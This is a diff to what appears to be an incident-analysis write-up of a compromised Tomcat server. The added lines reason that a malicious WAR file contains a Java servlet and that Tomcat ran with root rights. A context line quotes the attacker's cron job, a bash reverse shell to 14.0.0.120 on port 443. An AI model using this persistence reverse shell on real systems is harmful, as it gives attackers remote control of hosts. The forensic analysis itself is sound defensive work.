@@ -112,6 +112,8 @@ crontab -l -> * * * * * /bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'
 
 So, every 60 seconds, the server automatically executes this cron job, connect to the attacket host through port `443`.  
 
+Moreover from these command, I know that the `JXQOZY.war` file not contains web application like web shell, because from the image 10, there don't have any file html, css. So it is clearly that the malicious file contains some thing like java servlet so that Apache Tomcat server can run the java code in the shell of linux (the java code contain commands above). And one thing, there is a significant misconfigure in the server when Apache Tomcat can have the root permission in the server.
+
 After attack phase by `14.0.0.120`, the host `10.0.0.115` connected agains to web server. It seems like this is the admin that comeback to check the server after an alert of suspicious activity.
 <p align="center">
   <img src="./Assets/Image 11 - Admin check the server.webp" alt="Admin check the server" /> <br />
